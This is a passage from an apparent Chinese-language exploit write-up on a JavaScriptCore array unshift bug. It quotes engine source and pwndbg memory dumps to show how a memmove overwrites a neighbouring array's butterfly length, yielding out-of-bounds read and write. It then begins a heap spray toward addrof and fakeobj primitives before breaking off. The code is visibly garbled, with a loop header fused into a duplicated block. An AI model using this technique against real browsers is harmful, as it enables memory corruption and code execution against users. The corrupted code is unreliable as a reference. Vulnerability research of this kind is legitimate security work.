            storage = newButterfly->arrayStorage();
            storage->m_indexBias -= count;
            storage->setVectorLength(vectorLength + count);
            setButterfly(vm, newButterfly);
        } else if (!moveFront && vectorLength - length >= count)
            storage = storage->butterfly()->arrayStorage();
        else if (unshiftCountSlowCase(locker, vm, deferGC, moveFront, count))
            storage = arrayStorage();// 0x60 
        else {
            throwOutOfMemoryError(exec, scope);
            return true;
        }
        WriteBarrier* vector = storage->m_vector;
        if (startIndex) {
            if (moveFront)
                memmove(vector, vector + count, startIndex * sizeof(JSValue));
            else if (length - startIndex)
                memmove(vector + startIndex + count, vector + startIndex, (length - startIndex) * sizeof(JSValue));
        }
        for (unsigned i = 0; i m_indexBias >= count) {//m_indexBias ==0 butterfly()->unshift(structure(vm), count);
            storage = newButterfly->arrayStorage();
            storage->m_indexBias -= count;
            storage->setVectorLength(vectorLength + count);
            setButterfly(vm, newButterfly);
        } else if (!moveFront && vectorLength - length >= count)// moveFront == true
            storage = storage->butterfly()->arrayStorage();
        else if (unshiftCountSlowCase(locker, vm, deferGC, moveFront, count))
            storage = arrayStorage();// 0x60 
        else {
            throwOutOfMemoryError(exec, scope);
            return true;
        }
        WriteBarrier* vector = storage->m_vector;
如果内存布局像下面这样,
    vector = 0x7fe000287a78
    pwndbg> x/1000gx 0x7fe000287a78
    0x7fe000287a78: 0x00000000badbeef0      0x0000000000000000
    0x7fe000287a88: 0x00000000badbeef0      0x00000000badbeef0
    0x7fe000287a98: 0x00000000badbeef0      0x00000000badbeef0
    //..
    // 其他 object 的 butterfly,  length = 0xa
    0x7fe000287ff8: 0x00000000badbeef0      0x0000000d0000000a
    0x7fe000288008: 0x0000000000001337      0x402abd70a3d70a3d
    0x7fe000288018: 0x402abd70a3d70a3d      0x402abd70a3d70a3d
    // vector + 0x1000
    0x7fe000288a78: 0x0000000000000000      0x0000000d0000000a
    0x7fe000288a88: 0x0000000000001337      0x402abd70a3d70a3d
memmove之后, 可以把其他object 的 `buttefly` 的 length 改了，假如可以找到这个 object， 那么就可以利用这个
object 来构造越界读写了。
    // vector
    0x7fe000287a78: 0x0000000000000000      0x00000000badbeef0
    0x7fe000287a88: 0x00000000badbeef0      0x00000000badbeef0
    // 其他 object 的 butterfly,  length = 0x1337
    0x7fe000287ff8: 0x0000000d0000000a      0x0000000000001337
    0x7fe000288008: 0x402abd70a3d70a3d      0x402abd70a3d70a3d
    // vector + 0x1000
    0x7fe000288a78: 0x0000000d0000000a      0x0000000000001337
    0x7fe000288a88: 0x402abd70a3d70a3d      0x402abd70a3d70a3d
#### addrof 和 fakeobj 构造
首先喷一堆的object， 尝试构造出上面提到的内存布局，length都是 10， 这样新分配的内存就是 `10 * 8 + 0x10 = 0x60`,
就会和新申请的`storage` 分配在十分接近的内存上。 `spray[i]` 和 `spray[i+1]` 会连续分配
    for (let i = 0; i 